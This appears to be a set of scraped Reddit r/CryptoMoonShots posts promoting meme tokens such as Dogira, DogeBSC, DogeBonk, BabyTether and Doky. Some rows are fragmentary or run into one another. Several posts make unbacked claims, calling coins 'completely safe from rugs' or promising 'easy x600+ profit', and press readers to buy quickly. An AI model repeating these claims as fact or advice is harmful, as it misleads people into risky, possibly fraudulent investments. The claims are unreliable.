DEVS minted a beautiful series of NFT's that were sold in couple of minutes, for a total of 100 BNB, which will be used for Buy-Back and keep the DIP away 🥇

**There is also a play-to-earn game which can be seen in the telegram and will be available on launch, top high scorers will earn dogecoin straight to their wallet**

Team is working extremely hard to rewards this Diamond Hands community, filled by big player in the BSC space, with REAL DIAMOND HANDS and huge connections, leading the road to the MOON 🌘, while receiving $DOGE as reward.

At the same moment I'm writing, I have been rewarded with $1000 DOGE already (about 300$ worth), that's incredible.

If you want to join our group, keep in mind that you are extremely early, and we warmly welcome you to the Dogestribute community, which is full of hardcore diamond hand-holders and $DOGE reward gainers.💎",1005,2021-08-24 19:13:19,22

📊 Tokenomics 📊

✅ Initial Supply: 1 000 000 000 000

✅ 20% tax used for LP/Staking/Burn/marketing. Will be lowered later based on community vote!

✅ Initial LP generation event: Contract starts with Low LP and uses a special contract that injects liquidity during a short while after launch. During this time there is a sell limit of 0.05%(500.000.000 token) of the supply with a sell lock of 2h after launch that protects from dumps during low LP times. This setup guarantees a more frictionless path to the stratosphere while also ensuring a high liquidity at all times.

🚨 Max hold is 25.000.000.000 🚨 Max sell at the start is 500.000.000

✅ 85% token in liquidity ✅10% token in contract for initial LP generation event ✅5% token vested in contract for marketing (max 0.5% per day) excluded from staking

DOGE,CryptoMoonShots,I was one of the original developers on Dogecoin; Here's some very biased DD on the DeFi token I'm hanging my hat on this time round.,"**If you want the tl,dr; the relevant stuff starts under the heading ""The Token"".**

--

Preamble
--

A loooong time ago, [I worked with the Digibyte team to implement the Gravity Well algo into Dogecoin](https://www.reddit.com/r/dogecoin/comments/207hfb/ann_dogecoin16_its_ready_all_you_need_to_know/).

The purpose of this algo was to stop multipools from literally dumping on everyone who was genuinely interested in/mining the coin. The market cap increased by about 10% immediately after launch, because who tf likes getting dumped on?

Well, nobody. But people sure do like dumping on you! Later in my journey, [I had to whistleblow on my then-employer, who rugpulled millions from investors](https://www.reddit.com/r/dogecoin/comments/2jnhxt/this_is_the_person_i_know_as_ryan_kennedy_and_my/). That was expensive, and a harsh lesson learned in not trusting people in crypto. So, uh, following that then, I trusted cryptsy with all my coins - [who ""got hacked"", claiming all the coins were now gone](https://www.coindesk.com/cryptsy-bankruptcy-millions-bitcoin-stolen).

After that, I stepped out of crypto. Everything felt like a rug-pull.

Anyway, enter recent history - when I remembered that myself and the Digibyte devs did a Doge/DGB exchange after we worked together. I found the DGB wallet on an old HDD, which had matured to an amount that made crypto worth jumping back into.

--

Sea of Memes
--

So, let's cut to the chase - I, obviously having learned very little, jumped straight in to searching for the next thing that felt like Doge in the DeFi world.

Well, no - I think I learned a bit, in hindsight. For a start, it was spotting coins that were CLEARLY operating what were essentially just Ponzi Schemes. New coins appearing every 10 seconds, most of which can be sussed out by speaking with the developers, or community team managing a coin. But when 3 minutes of hesitation can cost someone 10x their gains, people are apeing into coins without even checking for liquidity locks, and getting absolutely flattened by the end of the day.

What's made these coins worse was that many of them had already been rugged, and abandoned by their developers - and the bagholders then come together to ~~find new bagholders~~ start building a community around the dumped coin. And often times, I only discovered that the coin had been dumped by the dev team when speaking privately with the token's new ""community team"", after offering to help out. So, the actual communities had no idea at all.

One of these coins in particular - which has now done pretty well - still has an absolutely massive amount of coins being held by the developers who previously rugged the project. The new community team made the nonplussed Developers into multi-millionaires; pending the dev team are willing to dump large portions of their wallets. The devs unfortunately, have been doing that - while the community blame it on ""bots"". 

The community team behind this coin asked me if I'd speak to the community on behalf of them (posting from this reddit account, and hosting an AMA on their token), which I turned down - my coins were pulled the second they gave me the low-down on how literally everyone invested into that token were on thin ice under a group which already dumped on them. The response from one of the community team members was ""Sir, this is a Casino"" before posting a link to some t-shirt merch in the main group chat. So, eh, time to hop out, yeah?

Nah, I found one more token, but it had literally just started. Had a tiny bit of traction in February, but not a lot beyond that. Telegram group was small, but atmosphere was pretty good. Dev was active, as were other core team members. The team were chatting with the community, and everyone was in pretty high spirits. Coin's tokenomics were really interesting; essentially built to punish sellers, and reward holders. More on that in a bit - but anyway, I threw in 0.5 ETH at around $0.005/token, and went to bed.

I woke up to my ETH having quadrupled in value, and the community telegram was suddenly popping off. Alright, so, probably time to check out what this token can do in the long-term! And thus, I present to you:

**The Good**

* Microcap Token; currently < $3mil in Market Cap

* Grew to this level organically - not yet listed on CoinGecko, or CoinMarketCap

* Core Team are active, friendly, and well-versed

* Deflationary in nature; each TX restributes 1% of tokens across all users, and an additional 1% of tokens into the DogeCity fund

* DogeCity fund is used to reward users who buy after someone sells - awarding them up to 5% of the sell fee in bonus tokens. This means that if you ""buy the dip"", you're awarded bonus coins, paid for by the seller!

* DogeCity fund additionally rewards every 10th buyer with the prize pool from previous purchases

* DogeCity wallet allows for transferring up to 0.1% of its contents to users who advertise the token, and bring in new hodlers

* Officially Partnered with Feed All Gorillas, with 4 million Dogira tokens being allocated to FEG's staking pool

* Audited, and approved by War on Rugs

* Project Lead is self-doxxed

* Community are super friendly and engaged - very reminiscent of old Doge.

----

**What could be better**

I don't believe in any ""perfect coin"" - there's always some problems. If you're not seeing them in your own holdings, being frank, you're not looking hard enough. Here's what I think Dogira needs to improve on;

* Utility - right now, Dogira is a hodl token. I think when it comes to DeFi, the hodler tokens are established. Tokens need Utility, difficult as it can be to implement it while gas fees are enormous.

* Display bug - the current codebase of Dogira contains a display bug which affects the Uniswap exchange; showing all sellers as the Uniswap wallet ID, rather than the actual seller's ID. Some have argued that this is a ""feature"", mind. Source code is available at https://etherscan.io/address/0x4b86e0295e7d32433ffa6411b82b4f4e56a581e1#code . Obviously, this is just a display bug - the actual coins go to the seller.

* Hype - while community members have been posting about the coin, they're not spamming up groups shouting ""SAFE PUMP, GET IN FAST""; and while that's great for keeping a massive wave of bagholders out, it also meant the token stayed relatively undiscovered. 

* Only on Uniswap - Uniswap is awesome, but tokens need to be on an exchange that accepts Fiat payments.

----

**Where Dogira is going from here**

As of last night, I joined Dogira's core founding team. The community and team have everything I loved about Doge, but without the multipool and ASIC-Driven mining problems that plagued Doge in the early days.

Priority #1 right now is in getting a public roadmap made available, outlining where we're taking the token in the medium, and long-term future. We've outlined that Utility, and Community will undoubtedly be at the core of our plans, alongside making the token more easily accessible for purchase.

Secondary to that, with the core team in agreement on where the coin should be going, we're now starting to ramp up our marketing efforts. We'll be going live with FEG over the weekend, creating hundreds/thousands of new holders. I'm also currently in the process of repurposing [my Steam Game](https://www.reddit.com/r/Games/comments/g47cqr/hey_reddit_in_2018_i_quit_a_crap_job_and_started/) to allow users to win Dogira tokens in an event/competition basis. While it's already had its big heyday, it's still got a small active community along with a 3,000-person Discord. (Yes, I'd love to build a full Dogira version - but gas fees are prohibitive right now).

Lastly, in the more immediate short-term, we'll be organising for Fireside chats with the core team on our Discord. We'll be speaking directly with the community and answering questions during these, making sure everyone's on the same page as far as Dogira's future development goes.

From there, the team will be looking towards Utility (my short time in creating NFTs, and more extensive time in working in Games Development will be up for discussion here), along with creating long-term value for Dogira hodlers and traders.

----

**Wen Moon?**

This isn't a quick moon coin. Or at least, it's not intended to be. It might well go parabolic, but the team behind it are in it for the long haul.

Our collective goal for Dogira is to hit $1 per token - requiring around 20x our current market cap. But given we've not yet appeared on CoinGecko, CoinMarketCap, or any fiat-supported exchanges - yet still hit a $2-3mil market cap, recovering strongly from every early-investor sell-off?

Personally, I'm insanely bullish on the future that the Dogira token has in store. And psyched to be on board.

And of course, it goes without saying - I am completely, and utterly biased in everything I've written above. I have bought into the token personally, and have now also invested my time into it. I am not a financial advisor - I've been rugged too many times to ever have that title. Do your own research, don't get carpet burns. They take a long fucking time to get out.",181,2021-03-20 00:39:59,67

DOGE,CryptoMoonShots,"Dogira (+20%/24hr), a CG-Listed coin lead by an OG Dogecoin Dev, has just announced a $20k USDT Marketing Bounty!","Disclaimer: I'm the OG Dogecoin Dev listed above. This post is as biased as it can possibly get. DYOR before buying into coins. While this post is as usual, not intended as financial advice, you should never take financial advice from people on reddit regardless. Unless you love big bags.

[For transparency: Previous post here regarding my onboarding with the Dogira team.](https://old.reddit.com/r/SatoshiStreetBets/comments/m8tncl/i_was_one_of_the_original_developers_on_dogecoin/)

----

So, lots happened with Dogira in a relatively short amount of time; We went live on our first CEX, we got listed on CoinGecko, we started doing AMA's with big crypto groups (WhiteBit and Satoshi Club AMA's coming this week!), and we saw a 3-4x price spike before cooling off into consolidation around our current zones. Along with this, we also delivered on our first batch of Investment NFTs; selling out to the tune of $35k in 10 hours!

While the 3-4x price spike was expected on the foot of the news of our roadmap, and team onboarding, it's worth noting here that the team obviously did not start selling off Dogiras; outside of the fact that we'd consider it to be selling on the cheap, we also knew that big spikes on early coins are typically not maintained; and that we needed to focus our efforts into showing more development, and more outreach across communities in order to ensure that we could consolidate in a good area, with catalysts planned ahead to keep the growth healthy.

So, the biggest catalyst coming up this week is our $20k USDT giveaway for our Marketing Bounty program, running through WhiteBit. This will allow people to share in the prizepool of $20k for promoting Dogira; such as getting tweets or videos about Dogira trending, and generally getting the word out there about the coin. As a team, we've worked hard in ensuring that Dogira never gets advertised as ""a quick pump"" or anything of the likes; which is completely against the long-term philosophy we have in the coin. Value needs to get built through tangible developments and noteable results. Now that we have our real foundations in place for the team, we're finally ready to begin marketing the project.

One of our biggest particulars on this was ensuring we had a roadmap up and available which the team could agree to our deadlines on, and begin delivering on immediately. Our full roadmap is up on https://dogira.net for anyone interested in taking a read through; and it details our core goals across 2021, with a heavy focus on further NFT ecosystem expansion, alongside delving into Blockchain Native Gaming.

If you're on the fence, I'd recommend checking out the coin at it's current consolidated/cool-off pricepoint; we've a lot coming ahead this week, and we're all excited to see where it takes us.

DOGE,CryptoMoonShots,Dogira an NFT project with an OG Dogecoin Dev,"Dogira can currently be tracked on CG and will be starting a $20k USDT Marketing Bounty TOMORROW!

Disclaimer: I did get shilled by the Dev’s post here a couple of days ago and since then being part of the community with stability and communication has been great. We are currently working on New CEX listings. 

So, the biggest catalyst coming up this week is our $20k USDT giveaway for our Marketing Bounty program, running through WhiteBit. This will allow people to share in the prizepool of $20k for promoting Dogira; such as getting tweets or videos about Dogira trending, and generally getting the word out there about the coin.

We will be doing an AMA with a big crypto group (Satoshi Club AMA's coming this week!)

The first round of Investment NFTs did sellout.

Our full roadmap is up on https://dogira.net for anyone interested in taking a read through; and it details our core goals across 2021, with a heavy focus on further NFT ecosystem expansion, alongside delving into Blockchain Native Gaming.

If you're on the fence, I'd recommend checking out the coin at it's current consolidated/cool-off pricepoint; we are currently sitting at 3 cents and been holding for about 36 hours and we've a lot coming ahead this week, and we're all excited to see where it takes us.

DOGE,CryptoMoonShots,DogeCoinCash - The New Dogecoin - Under 20k MCAP I Early !," 

This is a new token that recently appeared on the BSC. It's called DogeCoinCash, it has been thoroughly vetted and checked.

It is completely safe from rugs and scams, BUT: DO YOUR OWN RESEARCH & DON'T INVEST MORE THAN YOU'RE WILLING TO LOSE.

So, what about DogeCoinCash? First, it has a very small marketcap. This means it can grow and explode in just a couple of hours. It could be an easy 10x at least.

Second of all, its Telegram account (linked below) is pretty active. New holders are joining and users on the Telegram channel are steadily growing.

Third, this coin has been VETTED. You can check by yourself with the links down here: also, run your own checks, for example on RugScreen with the contract.

Go and open up the charts: this coin can pop in minutes, so what are you waiting for?

Bogecoin is a Dogecoin competitor on the Binance Smart Chain : a DEFLATIONARY auto staking coin with a fixed supply.

Supply: 2,000,000 ( < 1,000,000 now after initial burn)

Initial Distribution

In order for the autostaking functionality to proportionally redistribute specific percentages to specific wallets, the initial coin distribution needs to reflect those percentages. The initial distribution of BOGE tokens is as follows:

50% in burn wallet

50% to all BOGE holders

Autostaking

With the above distribution, the autostaking mechanism proportionally redistributes the 2% transaction fee to all wallets. Autostaking is automatic and immediate. This translates to this fee breakdown:

1% to burn wallet - 1% to all holders

DOGE,CryptoMoonShots,🐕 DogeCoin Dogecoin Plus ($Dcp) 20 hours old 100k mcap 280 holders,"This is a new moonshot token that launched one day ago. Buy now to secure your bag.

❓Why should you invest?

Dogecoin Plus is a safe investment for those that are interested in yield-generating and frictionless contracts. At Dogecoin Plus we stand united against cryptocurrencies with dodgy teams and their inhuman practices. We believe in the magic of cryptocurrency. We are here to stay.

At Dogecoin Plus we have no problem admitting that we’re using a fork of Safemoons elite contract. We are here for the people who missed the boat on that one. Hop in!

❓What makes it so 'plus'?

DogeCoin Plus because,

There is a finite amount of tokens (\~650T), compared to an infinite amount of DogeCoin, which is inflationary. The more coins you have, the less value each coin has.

\------------------------------------------------------------------------------------------------------------------------------------------------

Tokenomics

10% Transaction Tax (Buy/Sell/Transfer)

\- Initial supply: 1,000,000,000,000,000

\- 5% into Locked LP

\- 4% in reflections for Hodlers

\- 1% into Marketing Wallet

In summary

🐕 Holders get rewarded with passive income, the higher the volume of transactions the more you earn extra on top of your existing bag (so shill away).

🐕 Locked LP that acts as a deflationairy mechanism and removes tokens from circulation, thus increasing the value of your tokens.

🐕 Also provides more stability to the price of $DCP as it grows.

\------------------------------------------------------------------------------------------------------------------------------------------------

✅ No presale, silent & fair launch on BSC

✅ Not even one day old!

I think this could be it! If you guys know anything about BSC, you know that these coins can pickup steam and can go parabolic very quickly, especially right now when BNB has suffer a huge fall, the rebounding in the next days can result in colossal profit.

Just go in and HOLD!

As far I've seen in their Telegram channels and RSS this has a massive potential of growth, basically a new BSC token which you can expect and easily x600+ profit within the first hours if you are fast into in.

Devs are quite active and they said this won't be just a pump & dump coin since the purpose is to surpass all the Doges! They're spending 1% of the fee as marketing so the project shall continue in the time.

DOGE,CryptoMoonShots,"DogeBSC Releases Whitepaper for DogeBridge, the first ever Community-Driven Bridge to Dogecoin","The team at DogeBSC have finally released the **DogeBridge Whitepaper**!

DogeBridge   will act as a bridge from their native token, DogeBSC, to Dogecoin.   This means that Dogecoin holders can swap their coins directly for   DogeBSC and vice versa all through a decentralized exchange on their   website.

DogeBridge Whitepaper: [https://dogebsc.finance/data/DogeBridge.pdf](https://dogebsc.finance/data/DogeBridge.pdf)

DogeBridge Explanation by Developer: [https://www.youtube.com/watch?v=7FXTKS9MvtU](https://www.youtube.com/watch?v=7FXTKS9MvtU)

**Why is this important?**

As   BSC and DeFi grows, normal investors of Dogecoin will want to put a   foot into the BSC/ETH world while still wanting to be a part of the   greater Doge community. This way they can swap some or all of their   tokens over to BSC, all without the hassle and regulation of a central   exchange.

It's also important because it's a **real alternative to Binance Bridge**. For years the only bridge to the Dogecoin chain was on [binance.org/bridge](https://binance.org/bridge),   but now the DogeBSC team is creating their own. At the very least,   having the option to use The People's Bridge vs a generic Binance one   will attract investors.

**Whitepaper Excerpts:**

Why should investors care?

*This April,* ***Dogecoin’s average volume reached nearly $20b/day*** *and   $582b for the month. If we can tap into even 5% of this over the  coming  months through our bridge, our current 10% transaction tax would  net us  $97.1 million a day which we would funnel back into liquidity,   development, rewarding/burning, & charity, which would grow our   project and help our cause.*

*The development portion of these funds would* ***help*** ***accelerate the launch of Doge-based DeFi apps*** *and* ***strengthen our ecosystem***\*, further incentivizing more volume into our bridge and therefore more funds into the project.\*

What's Next?

***DogeWorld***\*. While our focus is on DogeBridge at the moment, we see this bridge as a\* ***launchpad to funnel*** *an ever-increasing percent of Dogecoin volume into an entire* ***ecosystem of community-backed DeFi applications.***

*This   will include services like DogeSwap, DogeWallet, DogeChart, DogeFarm,   DogeLend, etc. This ecosystem will be positioned as less of a  competitor  to Dogecoin, and more of a logical next step in the* ***evolution of Doge*** *and a by extension, a true* ***community-based DeFi economy.***

**What else is DogeBSC about?**

Charity! So far the community has donated over $11k to three different dog shelters through [The Giving Block](https://www.thegivingblock.com/)!! Here are the donation links below:

\- [HopeForPaws](https://twitter.com/DogeBSC/status/1388254354780590084) \- $5700

\- [Muttville & WrightWayRescue](https://twitter.com/DogeBSC/status/1383479076845850634) \- $5540

\- [Muttville shoutout](https://twitter.com/Muttville/status/1382778753491857411)

**Tokenomics**

Something   that separates DogeBSC from other tokens is that these tokenomics %  are  changeable up to a max of 10%. This means that over time if the  project  has different priorities the team can vote on reducing/changing  these  proportions.

\- 1% charity

\- 1% auto-staking

\- 1% burn

\- 2% community fund

\- 5% liquidity

DOGE,CryptoMoonShots,Looking for some 💠 $METH? 💠 We got it. Don't miss this chance to boom to the moon | Low Market Cap (ONLY $1M) | Ownership Renounced and Liquidity Locked,"#💠 Welcome to Methamphetamine Token 💠#

**Welcome to the wonderful world of legal 💠 $METH 💠**

It is a new coin, only 2 weeks old. Despite of this there is over 2.4k holders who have held strong through ups and downs

We are headed for the moon, don't miss your chance to come with us

We are a group of people who have put a lot of effort into this token, simply because we like the look of it. Our Telegram group is not filled with people spamming SHILL and other nonsense. We firmly believe in this and therefore we are making our best efforts to get other people into it.
 
The Methamphetamine token is a freshly launched gem. It is a community-driven project created by the lovers of the Breaking Bad TV Show. The fanbase is strong; the narrative is even stronger. Even if you haven't watched the show, you know what it is about. The memes have flooded the internet over the years and they won't be out of fashion any time soon. 

With tokens like Dogecoin, in the early stages (it is another league now), is that you had to get in quickly. Since the market cap is low, the investment risk is low, but it has good profit potential. The Methamphetamine token is running on the Binance Smart Chain and compared to other Binance Smart Chain tokens, the coin is still in very early stages as a perfect low cap coin to invest in for quick high gains. A huge plus is the number of active admins and positive FUD-Free community. Key ingredients for the perfect moonshot. 

Awesome things coming up in the next couple of weeks to shoot it up to the stars directly from their roadmap:

DOGE,CryptoMoonShots,"🐶 Pomeranian® ($Pome) The Next Dogecoin Killer, Multiple Use Cases, BuyBack System, Active Team Marketing Plan Long Term Project Whitelist Phase Start Now !!!","🌟 Welcome to the Pomeranian® project, which is a meme token which is inspired by the best existing memes projects in the market.

💫 We have the ambition to create a long-term project that will have a large community on board and a great impact on the Binance Smart Chain.

 We are launching our Whitelist today, it ends July 5th at 7pm UTC.

 Why Pomeranian ?

 To begin with, we chose to set up a BuyBack system because we believe in this method (and we saw how was the impact with other projects).

 In addition, we have many use cases that we will develop as the same time the community grow. Our use cases will be useful for you and also for all cryptocurrency investors.

 The biggest project that we have, is the development of a decision support tool that will allow BSC investors to get a better return on their investments.

The tool will take into account the state of the market at a given moment.

 We also have the ambition to make a mobile application in order to use it anywhere (also it will be a user friendly application).

 By the way, before creating this project, we are also investors. We know how frustrating is when someone invest on a scam project. We assure you that it is not our case because we think long term and we have a great vision.

 In addition to this we have already deployed our Whitepaper which you can find on our site. Take a look at it 🙂

 We are now auditing our contract and we will furthermore do more audits.

 The Pomeranian team thank you for the attention you give us, we really want to take this project as far as possible.

 Trust the process 🚀

DOGE,CryptoMoonShots,Dogebonk ($DOBO) 🏏 [>50m mill M.cap] - static reward token currently going viral - contract renounced / LP burned / Billboard NYC / Meme Generator created!,"DogeBonk is a completely unruggable, spontaneously formed community token with the most potential to go viral of any meme coin since Shiba.

Since DogeCoin exploded earlier this year there have been thousands of dog coins most of them scams, false promises and poor ripoffs with devs sole purpose being to make as much money from their holders as possible. Every day another team launches their coin trying to piggyback off the success of others, offering false promises of NFT marketplaces, metaverse worlds and whatever else is the newest trending hashtag on Twitter. These coins have forgotten that what makes you a meme coin is how good your memes are. Once you take a look at DogeBonk, you will understand why people are so excited by the idea of a meme coin with actual memes!

Ads have popped up on pornhub and a billboard appeared in Manhattan just outside of Times Square! DogeBonk is different. The DogeBonk community spontaneously formed just three weeks ago on a dead dog token someone found with locked liquidity, renounced contract and SafeMoon tokenomics. We have grown from <300 holders three weeks ago to over 4000 today. We have no false road maps promising the world, we just spread our hilarious meme and convince others to join us as we bonk everything. Despite this, the community continues to deliver. The recent Rubic partnership for BonkSwap now means that you can trade any token from many different chains in order to buy DogeBonk, or even buying with fiat. The bonk meme generator was just released at [app.dogebonk.com](https://app.dogebonk.com), allowing for anyone to easily generate a DogeBonk meme.

The memes and energy coming from this community is crazy. Just search DogeBonk on the search bar on Twitter and you’ll see what I mean. Once you see the quality of these memes you will see how DogeBonk has huge potential to go viral. DogeBonk is the most memeable project in the crypto space since Doge.

# Is DogeBonk safe?

*  Liquidity was locked forever by burning all LP tokens 🔥 Ownership of the contract was renounced.
*  See proof on our website.
*  Contract is a 1:1 copy of SafeMoon which was audited by Certik.
*  Top holder owns only 1.9% of the supply.
*  Audited, listed on coingeko and coinmarketcap

As microcap gems go, it’s an unruggable beauty.

# Tokenomics

* 10% tax on all transactions:
* 5% are distributed to fellow DOBO holders,
* 5% are added to liquidity to create an ever rising price floor.
* Token with deflationary properties and automatic yield generation. (Burn wallet is receiving \~1% of all transactions FORTY% burned so far)
* There was no presale and to prevent bots from sniping the token, you can only buy/sell 0.5% of the total supply at the time 🎯

DOGE,CryptoMoonShots,DogeBSC Releases DogeBridge Whitepaper - FIRST EVER bridge to Dogecoin!!!,"The DogeBSC team has finally released the **DogeBridge Whitepaper**!

DogeBridge will act as a bridge from their native token, DogeBSC, to Dogecoin. This means that Dogecoin holders can swap their coins directly for DogeBSC and vice versa all through a decentralized exchange on their website.

DogeBridge Whitepaper: [https://dogebsc.finance/data/DogeBridge.pdf](https://dogebsc.finance/data/DogeBridge.pdf)

DogeBridge Explanation by Developer: [https://www.youtube.com/watch?v=7FXTKS9MvtU](https://www.youtube.com/watch?v=7FXTKS9MvtU)

**Why is this important?**

As BSC and DeFi grows, normal investors of Dogecoin will want to put a foot into the BSC/ETH world while still wanting to be a part of the greater Doge community. This way they can swap some or all of their tokens over to BSC, all without the hassle and regulation of a central exchange.

It's also important because it's a **real alternative to Binance Bridge**. For years the only bridge to the Dogecoin chain was on [binance.org/bridge](https://binance.org/bridge), but now the DogeBSC team is creating their own. At the very least, having the option to use The People's Bridge vs a generic Binance one will attract investors.

**Whitepaper Excerpts:**

Why should investors care?

*This April,* ***Dogecoin’s average volume reached nearly $20b/day*** *and $582b for the month. If we can tap into even 5% of this over the coming months through our bridge, our current 10% transaction tax would net us $97.1 million a day which we would funnel back into liquidity, development, rewarding/burning, & charity, which would grow our project and help our cause.*

*The development portion of these funds would* ***help*** ***accelerate the launch of Doge-based DeFi apps*** *and* ***strengthen our ecosystem***\*, further incentivizing more volume into our bridge and therefore more funds into the project.\*

What's Next?

***DogeWorld***\*. While our focus is on DogeBridge at the moment, we see this bridge as a\* ***launchpad to funnel*** *an ever-increasing percent of Dogecoin volume into an entire* ***ecosystem of community-backed DeFi applications.***

*This will include services like DogeSwap, DogeWallet, DogeChart, DogeFarm, DogeLend, etc. This ecosystem will be positioned as less of a competitor to Dogecoin, and more of a logical next step in the* ***evolution of Doge*** *and a by extension, a true* ***community-based DeFi economy.***

**What else is DogeBSC about?**

Charity! So far the community has donated over $11k to three different dog shelters through [The Giving Block](https://www.thegivingblock.com/)!! Here are the donation links below:

\- [HopeForPaws](https://twitter.com/DogeBSC/status/1388254354780590084) \- $5700

\- [Muttville & WrightWayRescue](https://twitter.com/DogeBSC/status/1383479076845850634) \- $5540

\- [Muttville shoutout](https://twitter.com/Muttville/status/1382778753491857411)

**Tokenomics**

Something that separates DogeBSC from other tokens is that these tokenomics % are changeable up to a max of 10%. This means that over time if the project has different priorities the team can vote on reducing/changing these proportions.

\- 1% charity

\- 1% auto-staking

\- 1% burn

\- 2% community fund

\- 5% liquidity

DOGE,CryptoMoonShots,BabyTether 💸 Hold $BabyTether — earn $USDT ✅ CERTIK audited & passed KYC ✅ New Reflection GEM on BSC! 💎 Pre-sale on January 22!,"**Join TG:** [**https://t.me/BabyTetherApp**](https://t.me/BabyTetherApp)

# Introduction

*BabyTether is a new token in the Binance Smart Chain network, which allows each holder to receive permanent passive earnings, paid in $USDT.*

*What could be more stable and more confident than receiving rewards immediately in $?*

*Every week, tokens appear that pay rewards to holders in the form of other tokens (BNB, CAKE, ADA, AVAX, Dogecoin and so on). You depend at once on the price of two tokens: on the token that you are holding and on the other token in which you are credited with rewards. Of course, you can immediately sell the second token and convert it into dollars, but these are unnecessary actions, an unnecessary waste of attention and inconvenience. Especially if you are relaxing somewhere on the islands, drinking Pina Colada. Or you can hold the token that you receive as a reward, but this is an additional risk. The risk of the market falling, respectively, of this token.*

*Our team really likes the idea of ​​projects that pay rewards to holders immediately in the form of stablecoins (USDT, BUSD). But in reality, there are very few such high-quality projects on the market. That is why we are here!*

*Think about it. Why do you need extra actions? Why do you need additional risk, which is already enough in cryptocurrency? We do not see the need for this and are more inclined towards stability, to constancy. And there is nothing more stable in cryptocurrency than stablecoins. Regardless of the market, whether it goes up or down, you will always know that you have dollars in your portfolio that you can always use in real life. Better yet, when the market falling, you will have the funds to buy back the altcoins (which other projects offer you as rewards, haha) at even lower prices.*

*BabyTeather is not just a meme token, without functionality. Our team wants to make a great story out of this project. Something like BabyDogeCoin.. A wonderful project and wonderful admins. And we intend to repeat their success, but in a much more stable and acceptable form for ordinary people.*

*If you give a choice to an ordinary person who is not very familiar with cryptocurrency to buy a coin and receive rewards for it in CAKE/BNB/Dogecoin.. or in $, what will he choose? The answer is obvious. And our mission is to distribute BabyTether not in a narrowly focused way only in the cryptocurrency community, but by embracing a large number of ordinary people who are just starting to study the cryptocurrency world.*

# Features

**7% Redistribution in USDT**  
7% of every buy/sell is taken and redistributed to all holders. Hold $BabyTether tokens, earn USDT. A Minimum of 200,000 tokens is required in order to receive rewards.

**Rewards Paid Automatically**  
For the first time ever, you don’t need to claim your earned USDT. It’s automatically sent to your wallet. Just add the Tether USD token ($USDT) address to your wallet and you're set.

**Dashboard**  
[https://dashboard.babytether.app/](https://dashboard.babytether.app/)  
Our convenient dashboard optimized for any device will help you easily track and claim your rewards and monitor the current state of the BabyTether token.

**3% Liquidity Pool**  
3% of every transaction is converted into liquidity for PancakeSwap. It’s automatic and helps create a price floor (stability).

**1% Sell Fee**  
An extra 1% fee is applied to all sells. This will allow us to reduce swing-trading and break whales’ control.

**Secured By Design**  
Initial Liquidity Provided is locked with PinkSale. Fully Audited by CERTIK & InterFi.

**Massive Marketing Plan**  
5% of every transaction is allocated to Marketing in USDT. This allows us to fuel our most ambitious projects in service of further rewarding our community. Marketing wallet: [https://bscscan.com/address/0x9327fb6c88fa9e6abe7c9cf2f327fe5e48c5fd4c](https://bscscan.com/address/0x9327fb6c88fa9e6abe7c9cf2f327fe5e48c5fd4c)

**Calculator (coming soon)**  
[https://calculator.babytether.app/](https://calculator.babytether.app/)  
Soon after the launch, a calculator will be added, with which you can calculate your earnings in USDT, based on the number of BabyTether tokens in your wallet and the current trading volume.

**BabyTether Swap (coming soon)**  
[https://swap.babytether.app/](https://swap.babytether.app/)  
Soon after the launch, we will also add a built-in Swap to our website, so that anyone can buy BabyTether tokens even easier, without switching to other exchange platforms.

**Buy via Card (coming soon)**  
[https://buy.babytether.app/](https://buy.babytether.app/)  
It will become even easier for ordinary people to buy the BabyTether token! It is enough to make a payment directly with your bank card, after which you will receive BNB to the specified wallet, which you can exchange for BabyTether tokens in the Swap tab. 

# Dividend Distribution Mechanism

The dividend mechanism incentivizes token holders to hold in order to earn dividends from the transactions (buys and sells).

    The dividends are not dependent on the price of BabyTether. They are based purely on the volume and proportional to the BabyTether amount you hold in your wallet.

* All $USDT the contract gains are split proportionally between the token holders
* To receive dividends a minimum token balance of 200,000 BabyTether is required to be held in a wallet
* The contract keeps track of all the dividends due to each holder in a list
* Every transaction processes a certain number of users from the list
* The number of holders processed through each transaction is dynamic and based on transaction size
* Holders will receive dividends from the queue based on their position in the list
* It’s a fair system, fully automated

# Security

**The BabyTether team has taken several steps to ensure optimal security:**

1. The liquidity pool is locked for 12 months using the PinkSale platform
2. BabyTether contract address has been audited by one of the most popular and trustworthy companies CERTIK: [https://www.certik.com/projects/babytether](https://www.certik.com/projects/babytether)
3. The Founder of BabyTether provided the full KYC on the PinkSale, with documents and video confirmation (on the pre-sale page you can see confirmation of this)
4. 5% of the team tokens are locked for 12 months with linear unlocking (more information on the pre-sale page)

DOGE,CryptoMoonShots,$DOKY - a meme coin supported by Binance Top influencer - 4.3K+ Holders Right Now - Check Out Our Binance Article,"The world of cryptocurrency is full of meme coins, each trying to be the next big thing like Dogecoin, Shiba Inu or Pepe. But most of these coins are about dogs, cats, or frogs. 

While the market is flooded with dog, cat, and frog-themed coins, i found a one new entrant stands out for its distinctiveness and i do think this can be a next big meme coin if it catches some attention: The Donkey King, also known as 'Doky'. 

#Donkey king (Doky) is a Solana meme coin. Here’s why I am bullish on Doky meme coins:

**Uniqueness: A Refreshing Idea**

The first thing that got me interested in this meme coin is it's different from other meme coins. Wif , Pepe and other meme coins that made it to the top had one thing in common and that is all of these came up with a different meme idea. A copy pasted idea doesn't really last long in my opinion.

Donkeys are different and fun, making Doky stand out. People are always curious about new things, and a donkey coin is a fresh idea that can grab the  attention.

**Minimal Developer Involvement**

One of the most appealing aspects of Doky meme coin is the minimal involvement of developers in holding the coin’s supply. With most of the Doky supply held by the community and only 5% retained by the developer for project development, there's a reduced risk of large-scale sell-offs that can crash the coin’s value. 

This approach fosters trust and transparency, as the community knows that the developers are committed to the project’s growth rather than short-term gains.

**Doky MarketCap**

As per CoinMarketCap data Doky is currently sitting at $1.8 Million marketcap. 

If we compare it with the coins that made it to the top $1.8M marketcap is nothing. Pepe and Wif alone sitting at $6B and $3 billion marketcap. So the potential is huge if things start taking off and it takes no time for a meme coin. Most of you know that.

Meme Coins have so much potential and can make you life changing money if you get into it early and have a right choice.

DOGE,CryptoMoonShots,"Doge, Neiro And Neirei","While Dogecoin and Neiro are warming up, what about NeiRei?

Dogecoin is rising again with the rise of BTC.

After Kabosu died, the same family adopted a dog for the second time. This dog is Neiro. The dog that the Binance co-founder wrote an article about and referred to as the next Doge. The reason he referred to it as the next Doge is because it is the second dog that the Kabosu family adopted. Right now, everyone in crypto is referring to Neiro as the next doge and they even think that it will surpass Shiba in terms of market cap.

